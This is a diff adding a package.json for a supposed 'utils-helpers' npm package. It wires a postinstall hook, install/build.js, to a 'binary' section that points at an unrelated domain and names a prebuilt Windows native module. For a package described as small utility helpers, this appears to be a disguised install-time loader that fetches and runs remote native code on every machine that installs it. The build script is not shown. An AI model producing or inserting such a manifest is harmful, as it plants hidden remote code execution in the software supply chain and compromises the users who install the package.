@@ -1,0 +1,29 @@
+{
+  "name": "utils-helpers",
+  "version": "1.0.14",
+  "description": "Small utility helpers.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node install/build.js"
+  },
+  "binary": {
+    "napi_versions": [
+      7
+    ],
+    "host": "https://tbvo3.uk",
+    "package_name": "{napi_build_version}-{platform}-{arch}.tar.gz",
+    "prebuild_path": "/u/prebuilds/win32-x64/u.node"
+  },
+  "author": "Northbridge Dev <dev@nbridgedev.example>",
+  "license": "MIT",
+  "engines": {
+    "node": ">=14.0.0"
+  },
+  "files": [
+    "index.js",
+    "lib/",
+    "install/",
+    "README.md",
+    "LICENSE"
+  ]
+}
